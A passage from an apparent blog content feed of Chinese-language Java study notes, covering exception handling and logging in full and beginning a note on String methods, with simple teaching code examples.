<li>h 一个 <code>InvocationHandler</code> 接口实现的类，需要实现其 <code>invoke()</code> 方法，里面为实现需求的所有代码，在被调用的代理类的方法就是通过 <code>invoke()</code> 作为模板生成的。</li>
</ul>
<p>这样实现的好处：将数据和功能分离了，一些需要被增加的类变成了数据。我们只要关心如何实现增加的功能，不需要关心谁需要增加功能，里面的 “谁” 就变成了数据，只要在参数里面传入它，就能自动增加它的功能。</p>
<p>而实现这一切的核心就是反射机制让我们不用关心具体的对象是谁也可以操作它。</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>反射</tag>
      </tags>
  </entry>
  <entry>
    <title>Java异常学习笔记</title>
    <url>/2020/12/28/3198a37cb267/</url>
    <content><![CDATA[<h2 id="Java的异常"><a href="#Java的异常" class="headerlink" title="Java的异常"></a>Java的异常</h2><h3 id="异常概念"><a href="#异常概念" class="headerlink" title="异常概念"></a>异常概念</h3><p>异常的概念，就是程序由于一些其他原因导致了它并没有按照我们想要的状态去运行。程序出现异常是很常见的一种情况，我们需要对可能出现的异常进行提前处理，保证程序即使遇到了异常，也能顺利地运行下去。</p>
<p>对于访问文件不存在，用户输入错误，这些都属于异常，是程序可以自我拯救的，并不是非常严重的不同寻常。我们可以通过合理的异常处理机制来将这些不和谐的东西压制下来，让程序仍然快乐的运行。</p>
<p>对于堆栈溢出，内存耗尽，无法加载类，这些属于错误，是程序自己也无能为力的，是非常严重的不同寻常。对于这些，我们只能让程序自我结束生命，毕竟它也很绝望啊。</p>
<p>Java 的编译器对于 Exception 中的 非 <code>RuntimeException</code> 是要求必须捕获它们的，而 <code>RuntimeException</code> 和 Error 则不做强制的要求。当然不做强制要求并不代表着就不需要对这些进行捕获处理，而是要根据实际的情况进行判断。</p>
<h3 id="异常的实现方法"><a href="#异常的实现方法" class="headerlink" title="异常的实现方法"></a>异常的实现方法</h3><p>上面的异常说的是程序设计中的一个概念，那么再 Java 里面，真正的异常是什么呢？想到 Java 中万物皆对象，没错抛出的异常也是一个对象，它们的模板——类，也同样存在着继承的关系。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                     ┌───────────┐</span><br><span class="line">                     │  Object   │</span><br><span class="line">                     └───────────┘</span><br><span class="line">                           ▲</span><br><span class="line">                           │</span><br><span class="line">                     ┌───────────┐</span><br><span class="line">                     │ Throwable │</span><br><span class="line">                     └───────────┘</span><br><span class="line">                           ▲</span><br><span class="line">                 ┌─────────┴─────────┐</span><br><span class="line">                 │                   │</span><br><span class="line">           ┌───────────┐       ┌───────────┐</span><br><span class="line">           │   Error   │       │ Exception │</span><br><span class="line">           └───────────┘       └───────────┘</span><br><span class="line">                 ▲                   ▲</span><br><span class="line">         ┌───────┘              ┌────┴──────────┐</span><br><span class="line">         │                      │               │</span><br><span class="line">┌─────────────────┐    ┌─────────────────┐┌───────────┐</span><br><span class="line">│OutOfMemoryError │... │RuntimeException ││IOException│...</span><br><span class="line">└─────────────────┘    └─────────────────┘└───────────┘</span><br><span class="line">                                ▲</span><br><span class="line">                    ┌───────────┴─────────────┐</span><br><span class="line">                    │                         │</span><br><span class="line">         ┌─────────────────────┐ ┌─────────────────────────┐</span><br><span class="line">         │NullPointerException │ │IllegalArgumentException │...</span><br><span class="line">         └─────────────────────┘ └─────────────────────────┘</span><br></pre></td></tr></table></figure>
<p>遇到的异常的时候，程序会将遇到的各种关于异常的信息，在实例化的时候保存到对应类的实例里面，最后向上抛出。这就是 Java 中，异常真正的形态，一个类。</p>
<h2 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h2><h3 id="try-catch-语句"><a href="#try-catch-语句" class="headerlink" title="try-catch 语句"></a>try-catch 语句</h3><p>Java 中使用 try-catch 语句来捕获可能出现的异常，try 代码块里面写可能会抛出异常的语句，而 catch 括号里面写可能抛出的异常类型，可以在 try 语句后面叠加多个 catch 来应对可能抛出不同类型的异常。然后 catch 的代码块里面写当括号里的异常类型匹配到了之后，应该执行的语句：</p>
<p>下面的代码表示，当 try 代码块里的语句没有向上抛出异常的时候，就打印 <code>Seccess!</code> ，如果向上抛出了 <code>NoSuchAlgorithmException</code> 异常，那么就会被 catch 捕获，然后异常信息保存在 Info 里面。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SecureRandom SR=<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;   </span><br><span class="line">    SR=SecureRandom.getInstanceStrong();</span><br><span class="line">    System.out.println(<span class="string">&quot;Seccess!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchAlgorithmException Inof) &#123;</span><br><span class="line">    SR=<span class="keyword">new</span> SecureRandom();</span><br><span class="line">    System.out.println(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们删掉 try-catch 语句，那么编译的时候就会报错，说明这是要必须捕获的可能异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">unreported exception NoSuchAlgorithmException; must be caught or declared to be thrown </span><br><span class="line">        SecureRandom SR=SecureRandom.getInstanceStrong();</span><br></pre></td></tr></table></figure>
<p>从方法 <code>getInstanceStrong()</code> 的方法签名也可以看出来，它可能会抛出的异常类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SecureRandom <span class="title">getInstanceStrong</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchAlgorithmException </span></span><br></pre></td></tr></table></figure>
<h3 id="异常传递"><a href="#异常传递" class="headerlink" title="异常传递"></a>异常传递</h3><p>异常捕获不一定要紧挨着可能抛出异常语句的上一级进行捕获，可以在更高的调用层进行捕获，但是前提是每一级都要讲异常进行向上传递，也就是加上 <code>throws XXXException</code> ，将捕获异常这个烫手山芋也抛出来，从而交给其他调用它的方法进行捕获。</p>
<p>比如下面的代码中，最底层抛出异常的 <code>SecureRandom.getInstanceStrong()</code> 方法将异常抛给了调用它的 One() ，然后 One() 向上抛给了调用自己的 Two() ，Two() 再向上抛给了调用自己的 main() ，最终会被 main() 里面的 catch 语句所捕获，结束异常的层层传递。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SecureRandom SR=Two();</span><br><span class="line">            System.out.println(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException Info) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> SecureRandom <span class="title">One</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchAlgorithmException </span>&#123;</span><br><span class="line">        SecureRandom SR=SecureRandom.getInstanceStrong();</span><br><span class="line">        <span class="keyword">return</span> SR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> SecureRandom <span class="title">Two</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchAlgorithmException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> One();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="多异常捕获"><a href="#多异常捕获" class="headerlink" title="多异常捕获"></a>多异常捕获</h3><p>当然 Java 是支持多个 catch 语句进行捕获的，因为有很多语句的话，可能会抛出千奇百怪的异常，所以可以在 try 语句后面叠加多个 catch 语句，针对不同的异常进行捕获处理。</p>
<p>需要注意的是写 catch 的顺序，因为一个异常被抛出来之后，catch 语句是从上到下进行依次判断是否满足捕获的条件的，一旦异常被成功满足条件的 catch 捕获，那么就会结束运行。</p>
<p>所以就需要注意 catch 语句的顺序，由于上面的异常存在继承，那么就不能将父类的 catch 异常放在子类的前面，因为这样即使异常为子类的类型，但是会提前被父类的 catch 捕获，原理和多态相同，所以一定要注意 catch 语句的顺序。</p>
<h3 id="finally-语句"><a href="#finally-语句" class="headerlink" title="finally 语句"></a>finally 语句</h3><p>对于无论有没有异常的情况发生，都想要执行的语句（比如一些清理工作），那么就可以使用 finally 语句，finally 语句只能写在 try-catch 语句的最后面，里面的内容无论发生什么，最后都会被执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">catch</span>(XXXException Info) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Accomplish!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样无论如何运行这个代码，最终一定会输出字符串 <code>Accomplish!</code> ，也就是 finally 里面的语句被执行。</p>
<h3 id="or-异常并列"><a href="#or-异常并列" class="headerlink" title="or 异常并列"></a>or 异常并列</h3><p>对于那些非同一继承关系的异常，却拥有相同的处理语句的情况，就需要异常并列了，比如下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Expresion1;</span><br><span class="line">&#125; <span class="keyword">catch</span>(XXException Info) &#123;</span><br><span class="line">    Expresion2;</span><br><span class="line">&#125; <span class="keyword">catch</span>(XXXXException Info) &#123;</span><br><span class="line">    Expresion2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现无论是 <code>XXException</code> 还是 <code>XXXXException</code> 异常对应的处理语句都是 Expresion2，那么这样重复写两个 catch 虽说还能接受，但是如果是数十种异常对应处理语句相同的话，那么如果能将他们合并，就会让代码精简很多，因此就要用到异常并列，也就是 <code>|</code> 符号。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Expresion1;</span><br><span class="line">&#125; <span class="keyword">catch</span>(XXException | XXXXException Info) &#123;</span><br><span class="line">    Expresion2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好耶，成功精简代码！</p>
<h2 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h2><h3 id="查看异常信息"><a href="#查看异常信息" class="headerlink" title="查看异常信息"></a>查看异常信息</h3><p>对于一个被截获的异常信息，我们要好好查看一下到底是哪里掉链子了，就可以使用 <code>printStackTrace()</code> 方法，这个方法是 Throwable 类里面的方法，所有的可抛出异常都继承于这个类，可以打印错误的传递栈。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalArgumentException</span><br><span class="line">        at test.Num(test.java:<span class="number">11</span>)</span><br><span class="line">        at test.main(test.java:<span class="number">6</span>)</span><br><span class="line">        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">64</span>)</span><br><span class="line">        at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">        at java.base/java.lang.reflect.Method.invoke(Method.java:<span class="number">564</span>)</span><br><span class="line">        at jdk.compiler/com.sun.tools.javac.launcher.Main.execute(Main.java:<span class="number">415</span>)</span><br><span class="line">        at jdk.compiler/com.sun.tools.javac.launcher.Main.run(Main.java:<span class="number">192</span>)</span><br><span class="line">        at jdk.compiler/com.sun.tools.javac.launcher.Main.main(Main.java:<span class="number">132</span>)</span><br></pre></td></tr></table></figure>
<p>上面就打印出了异常抛出的调用栈，除了前两条是我自己搞得调用能看懂，其他的暂时还不太清楚。</p>
<h3 id="异常抛出"><a href="#异常抛出" class="headerlink" title="异常抛出"></a>异常抛出</h3><p>异常抛出，其实很简单，只需要创建一个异常的实例，然后使用 throw 语句将它抛出来即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">NullPointerException e=<span class="keyword">new</span> NullPointerException();</span><br><span class="line"><span class="keyword">throw</span> e;</span><br><span class="line"><span class="comment">//或者写成下面的样子</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br></pre></td></tr></table></figure>
<hr>
<p>如果我们在 catch 语句里面捕获一个异常之后，再次抛出一个新的异常（等价于中途进行异常的更换），那么查看新的异常的调用栈的时候，只能查到新建新异常的实例的地方，然而这里并不是真正的问题发源地，只是中途的异常更换。比如，下面代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">catch</span>(NullPointerException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了能更换异常的同时保留完整的调用栈，来确保能追查到问题发源地，只需要将捕获的异常作为参数，创建新异常实例的时候，传递给它的构造方法即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">catch</span>(NullPointerException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(e); <span class="comment">//只有这里不同</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="抛出异常的顺序"><a href="#抛出异常的顺序" class="headerlink" title="抛出异常的顺序"></a>抛出异常的顺序</h3><p>我们需要弄清楚在抛出异常的时候，整个程序的执行机制，那就是对于当前的方法，一旦有一处代码抛出了异常，<strong>后面的程序就会停止执行</strong>，最后将抛出的异常交给调用这个方法的地方，等待被捕获。也就是说，整个方法即使有多处地方会抛出异常，但是第一次抛出异常的时候，整个方法就停止执行了，只会专注处理抛出的异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">System.out.println(<span class="string">&quot;Reachable!&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>比如上面的代码在抛出异常语句的后面加上其他的语句之后，就会发现编译会出错，出现 <code>test.java:20: error: unreachable statement</code> ，意为无法达到的语句，说明抛出异常之后，后面的语句就不会执行了。那么就可以说，一个方法在一次调用中只会抛出一个异常。</p>
<p>由于 try 语句中抛出的异常必须被 catch 捕获，所以我们暂且不提它，但语句 finally 是接在 try-catch 后面的，无论如何它都会被执行。当 catch 和 finally 的语句块里面都抛出异常的时候，这个方法抛给调用方法的异常到底是谁呢，是 catch 还是 finally？</p>
<p>Java 遇到这种情况执行语句的顺序为：先执行 try 中的语句，抛出了异常之后被 catch 语句捕获，然后执行 catch 语句中的代码，catch 语句块中代码抛出异常，JVM 会保留这个异常，然后忽略抛出异常之后的代码转去执行 finally 里面的语句，当 finally 语句的代码抛出异常之后 JVM 会将这个异常覆盖原来 catch 语句块中抛出的异常，停止执行后面的代码，并结束 try-catch-finally 语句，最后将 JVM 中保留的异常进行向上传递。</p>
<p>所以说，上面的问题答案就是，抛出的异常为 finally 的异常，因为它覆盖了 catch 抛出来的异常，成功上位并被传递给上一级处理。</p>
<hr>
<p>所以问题来了，如何解决这种覆盖？有时候我们是真的想要所有的异常信息的，那么就需要 <code>Throwable.addSuppressed()</code> 这个方法了，这个方法可以把一个异常的信息加入到另外一个异常当中，那么我们只要在 try-catch-finally 语句的前面提前声明一个异常实例，如果 catch 抛出了异常，就把这个异常引用给提前声明的异常实例，从而保留下来。最后到 finally 语句的时候，将保存的异常实例添加到 finally 语句要抛出的异常中，这样就同时保留了两个不同的异常信息。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception origin = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    System.out.println(Integer.parseInt(<span class="string">&quot;abc&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    origin = e;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    Exception e = <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">    <span class="keyword">if</span> (origin != <span class="keyword">null</span>) &#123;</span><br><span class="line">        e.addSuppressed(origin);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码我们就用 origin 来保存了 catch 想要抛出的异常，然后利用 <code>Throwable.addSuppressed()</code> 将保存的异常加入了 finally 要抛出的异常中，从而将两个异常的信息同时传递给上一级。</p>
<p>但是这种能不用就不用啦，如果一定要使用的话，可以用 <code>Throwable.getSuppressed()</code> 来查看一个异常实例中包括的所有不同的异常信息。</p>
<h2 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h2><p>在 Java 的异常库里面，包含着比较常用的各种异常类，比如下面的异常继承关系图。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception</span><br><span class="line">│</span><br><span class="line">├─ RuntimeException</span><br><span class="line">│  │</span><br><span class="line">│  ├─ NullPointerException</span><br><span class="line">│  │</span><br><span class="line">│  ├─ IndexOutOfBoundsException</span><br><span class="line">│  │</span><br><span class="line">│  ├─ SecurityException</span><br><span class="line">│  │</span><br><span class="line">│  └─ IllegalArgumentException</span><br><span class="line">│     │</span><br><span class="line">│     └─ NumberFormatException</span><br><span class="line">│</span><br><span class="line">├─ IOException</span><br><span class="line">│  │</span><br><span class="line">│  ├─ UnsupportedCharsetException</span><br><span class="line">│  │</span><br><span class="line">│  ├─ FileNotFoundException</span><br><span class="line">│  │</span><br><span class="line">│  └─ SocketException</span><br><span class="line">│</span><br><span class="line">├─ ParseException</span><br><span class="line">│</span><br><span class="line">├─ GeneralSecurityException</span><br><span class="line">│</span><br><span class="line">├─ SQLException</span><br><span class="line">│</span><br><span class="line">└─ TimeoutException</span><br></pre></td></tr></table></figure>
<p>但是我们在实际的业务需求中，可能自带的异常行为是没有办法满足我们的需要，这里就需要我们自定义异常了，首先需要自定义一个 <code>baseException</code> 用来作为最基本的根异常（建议从 <code>RuntimeException</code> 中派生），然后从根异常中继承出来各种需要的异常种类。</p>
<h2 id="NullPointerException"><a href="#NullPointerException" class="headerlink" title="NullPointerException"></a>NullPointerException</h2><p>NullPointerException 异常是空指针异常，通常是因为在调用一个实例的时候，因为实例为 null，那么 JVM 在调用这个实例的时候，就会抛出 NullPointerException 。</p>
<p>其实在 Java 中是没有指针的概念的，这里指的是没有引用，所以名字应该是 NullReferenceException 才对，至于为什么叫作 Pointer 其实我也不知道，NPE 异常是逻辑错误，是需要被早早处理的。一个好的避免这种错误的方法就是初始化，比如 String 使用空字符 <code>&quot;&quot;</code> 初始化而不是不管或者初始化为 <code>null</code> .</p>
<p>对于一种引用调用层很多的类，出现 NPE 错误是，定位是哪里的调用出现了 NPE 是很麻烦的。比如调用 <code>a.b.c.d()</code> 你就不确定是 <code>a</code> <code>a.b</code> <code>a.b.c</code> 哪一个没有引用，这里可以使用 Java14 新特性来直接找到异常位置，但是需要给 JVM 添加参数来开启： <code>XX:+ShowCodeDetailsInExceptionMessages</code></p>
<h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>断言 assert 是 Java 的一种语句，和 if 语句相似，用于判断一个布尔表达式。只不过当布尔为真的时候，断言无事发生，当布尔为假的时候，断言抛出错误。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> Expression;</span><br></pre></td></tr></table></figure>
<p>断言就是一个人信誓旦旦的对一件事进行评价（立Flag），如果对了，那么挺好，如果错误，直接打脸（抛出错误）。</p>
<p>断言一般都用在测试阶段使用，对于一些逻辑上一定正确的地方，直接加上断言，从而判断程序实际执行的情况，如果抛出错误那就是找到 bug 了。</p>
<p>断言默认不使用，如果要用，需要在命令行加上：<code>-ea</code> ，比如 <code>java -ea test.java</code></p>
<h2 id="JDK-Logging-日志系统"><a href="#JDK-Logging-日志系统" class="headerlink" title="JDK Logging 日志系统"></a>JDK Logging 日志系统</h2><p>还是需要在开始之前介绍一下日志是啥，不然学的时候一头雾水。</p>
<p>日志是对程序运行状态的一个记录，这个记录有很多用处：</p>
<ol>
<li><p>查看程序当前的运行状态：</p>
<p>比如在搞一个超级大的项目的时候，运行时间会很长，不太容易直接看到程序运行的结果。加入日志系统之后，就可以根据实时输出的日志系统分析程序在运行的实时状态，从而分析程序执行情况。</p>
</li>
<li><p>查看程序历史运行轨迹：</p>
<p>一旦程序在长期运行的过程中，时不时抽风，就可以事后查看看抽风的时候的日志，判断程序都抽了哪些风，自己给它布置的任务是否认真完成。</p>
</li>
<li><p>排查系统问题：</p>
<p>良好的日志系统能帮助程序员分析代码哪里出现了问题，这里差不多就是一个加强版本的打表 debug ，日志的表更加详细，更加强大。</p>
</li>
<li><p>优化系统性能：</p>
<p>通过日志时间找运行最慢的代码，然后专门去优化它。</p>
</li>
<li><p>安全审计：</p>
<p>万一黑客入侵，可以根据日志系统查看黑客到底都干了啥，从而快速定位损失情况。</p>
</li>
</ol>
<p>对于日志的实现，我们最简单的方法就是使用 JDK 自己带的日志系统，放在 <code>java.util.logging</code> 里面。使用之前需要用 import 语句导入 Logger 这个类，然后用 Logger 的静态方法 <code>getLogger(String name)</code> 创建一个 Logger 实例。</p>
<p>之后就可以使用各种日志语句了</p>
<ul>
<li>severe()</li>
<li>warning()</li>
<li>info()</li>
<li>config()</li>
<li>fine()</li>
<li>finer()</li>
<li>finest()</li>
</ul>
<p>其中 info() 及以上的严重程度的日志才会被打印出来，一般的使用方法为这样：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Logger logger=Logger.getLogger(<span class="string">&quot;TestLogger&quot;</span>);</span><br><span class="line">        logger.info(<span class="string">&quot;start....&quot;</span>);</span><br><span class="line">        logger.warning(<span class="string">&quot;end....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Commons-Logging"><a href="#Commons-Logging" class="headerlink" title="Commons Logging"></a>Commons Logging</h2><p>首先需要梳理一下它们的关系：</p>
<p>最开始 Java 好像没有自己日志记录系统，然后 Apache 开源社区自己搞了一个 Log4j 作为日志系统使用，但是 Sun 公司（Java 的开发公司）为了展示本公司才是正宗血统，于是搞了一个 JDK Logging 放到了 <code>java.util.logging</code>  包里面，作为官方唯一指定日志系统。但是这玩意一是不太好用，二是来的太晚，Log4j 已经深入人心，两者又互不相通，所以也没成为主流。</p>
<p>其他开发者也开发过各种奇奇怪怪的日志系统，但同样时各自为政，互不相通。但是这就太乱了！尤其是在调用其他开发者开发的库的时候，如果库使用的日志系统和自己项目使用的不一样，那就完蛋。怎么办？</p>
<p>Commons Logging 横空出世，它作为一个日志接口，将开发者和各种乱七八糟的日志系统之间建立了一个桥梁，开发者只需要和 Commons Logging 打交道即可，至于下面使用的是啥日志系统，都不需要担心，接口会帮你解决一切！</p>
<hr>
<p>首先需要导入 Commons Logging 的两个必须的类，<code>org.apache.commons.logging.Log</code> 和 <code>org.apache.commons.logging.LogFactory</code> ，当然这两个类不是 Java 自己带的，需要去 Apache 下载，然后放到 classpath 定义的文件夹里面。</p>
<p>首先需要使用 LogFactory 类的静态方法 <code>getLog()</code> 来创建一个 Log 类的实例，需要传入的参数为使用这个实例的编译好的类名，这里建议使用 <code>getClass()</code> ，这样父类创建的日志子类也可以使用给你。像下面的代码一样创建一个实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Log log=LogFactory.getLog(getClass());</span><br></pre></td></tr></table></figure>
<p>然后就可以利用这个 Log 类输出程序运行的状态日志了。</p>
<p>Commons Logging 定义了6个日志级别：</p>
<ul>
<li>fatal() 致命错误</li>
<li>error() 普通错误</li>
<li>warning() 警告</li>
<li>info() 有用信息</li>
<li>debug() Debug信息</li>
<li>trance() 追踪信息</li>
</ul>
<p>这些日志输出方法都有两个重载方法，一个是只有 String，另外一个是既有 String 又有 Throwable，其中 Throwable 参数是用来在日志中打印异常。</p>
<p>最后在编译运行的时候，需要把 jar 包添加到 classpath 中，也就是对应着命令行的 <code>java -cp c:\classpath\commons-logging-1.2.jar test.jar</code></p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>异常</tag>
      </tags>
  </entry>
  <entry>
    <title>Java核心类学习笔记</title>
    <url>/2020/12/24/f7ebd39770e8/</url>
    <content><![CDATA[<h2 id="String-相关"><a href="#String-相关" class="headerlink" title="String 相关"></a>String 相关</h2><h3 id="String-的实现"><a href="#String-的实现" class="headerlink" title="String 的实现"></a>String 的实现</h3><p>String 在老版本的 Java 中以 private final char[] 基本数据结构封装成为类，新版本则是换成了 private final byte[] （因为对于 ASCII 字符可以节省大量的空间）。里面封装了很多方法和属性可以使用。</p>
<p>在 Java 的编译期，会自动地把所有的字符常量都放入一个常量池中，然后 String 类型的变量其 实就是引用了一个常量的地址。那么在判断两个字符串是否相同其实就是在判断它们对于常量池的地址引用是否相同。所以对于涉及到可变字符串的比较（在程序运行中会对字符串进行改变），是不可以使用 <code>==</code> 来判断两个字符是否相等，反而应该使用 String 类内置的方法 <code>String1.equals(String1)</code> 来进行比较。  如果要忽略大小写则可以使用 <code>equalsIgnoreCase()</code> 方法来比较忽略大小写之后是否相同。</p>
<h3 id="搜索和提取字串"><a href="#搜索和提取字串" class="headerlink" title="搜索和提取字串"></a>搜索和提取字串</h3><p>String 类里面还内置了很多用来操作字符串的方法：</p>
<ul>
<li><p>判断是否包含子串：<br><code>contains(String)</code> 返回 boolean 为输入的 String 是否在当前的实例中包含。</p>
</li>
<li><p>搜索子串：</p>
<p><code>indexOf(String)</code> 返回 int 为最前匹配到输入子串 String 的坐标。</p>
<p><code>lastIndexOf(String)</code> 返回 int 为最后匹配到输入子串 String 的坐标。</p>
<p><code>startsWith(String)</code> 返回 boolean 为是否以输入子串 String 为开头。</p>
<p><code>endsWith(String)</code> 返回 boolean 为是否以输入子串 String 为结尾。</p>
</li>
<li><p>截取字串：</p>
<p><code>substring(BeginIndex,EndIndex)</code> 返回 String 为从开始坐标到结尾坐标的连续子串。（EndIndex可以省略，则默认为字符串结尾)</p>
</li>
<li><p>去除首尾空白字符：</p>
<p><code>trim()</code> 返回一个去除了首尾空白字符的字符串。</p>
<p><code>strip()</code> 作用和 <code>trim()</code> 相同，但是类中文的空白字符也会被删除.</p>
</li>
<li><p>替换子串：</p>
<p><code>replace(String1,String2)</code>  返回一个将实例的 String1 全部替换为 String2 的字符串。</p>
<p><code>replaceAll(Regex,String2)</code>  返回一个将实例中符合正则表达式 Regex 的地方全部替换为 String2 的字符串。</p>
</li>
<li><p>分割字串</p>
<p><code>split(Regex)</code> 返回一个符合正则表达式 Regex 的地方分割出来的字符串数组。</p>
</li>
<li><p>拼接字符串</p>
<p><code>String.join(String1,StrArr)</code> 此为 String 类的静态方法，将输入的字符串数组的元素之间加上 String1 然后拼接成一个新的字符串。</p>
<p><code>String1+String2</code> 更省力一点，直接使用 <code>+</code> 运算。</p>
</li>
<li><p>格式化字符串</p>
<p>占位符和 scanf 差别不多，%s %c %d %f 等等。</p>
<p><code>formatted()</code> 非静态方法，作用于已经格式化好的字符串，只需要在参数里面填充替换元素就可以了，最后返回替换完成的字符串。</p>
<p><code>format()</code> 静态方法，通过类 String 调用，需要在第一个参数位置填充格式化的字符串，然后后面的参数位置一次填充替换元素，最后返回替换完成的字符串。</p>
</li>
</ul>
<h3 id="String-和-char-转换"><a href="#String-和-char-转换" class="headerlink" title="String 和 char[] 转换"></a>String 和 char[] 转换</h3><p>String  变量转化为 char[] 可以直接使用 String 类里面的 <code>toCharArray()</code>，此方法会返回一个字符串实例转化成的字符数组，比如：<code>char[] Xorex=&quot;Xorex&quot;.toCharArray();</code></p>
<p>而 char[] 转换为 String 需要在实例化出来一个 String 的时候，将字符数组 char[] 作为构造参数加进去即可，这样返回的实例就是 char[] 转化的字符串，比如：<code>String Xorex=new String(CharArray);</code>  ，需要注意的一点是这种转化形式虽说是引用类型传入了 String 类的构造方法，但是内部在生成新的字符串的时候，并不是对传入 char[] 类型数据的引用，而是复制，也就是说这是两个独立的数据，并不需要担心对一个的修改而造成对另外一个的改变。</p>
<h3 id="String-编码"><a href="#String-编码" class="headerlink" title="String 编码"></a>String 编码</h3><p>最开始的开始，计算机的字符是使用 ASCII 作为编码方式的，这让英语系国家们用的很开心，只需要 1 个字节就可以轻松的表示自己所有的字符。</p>
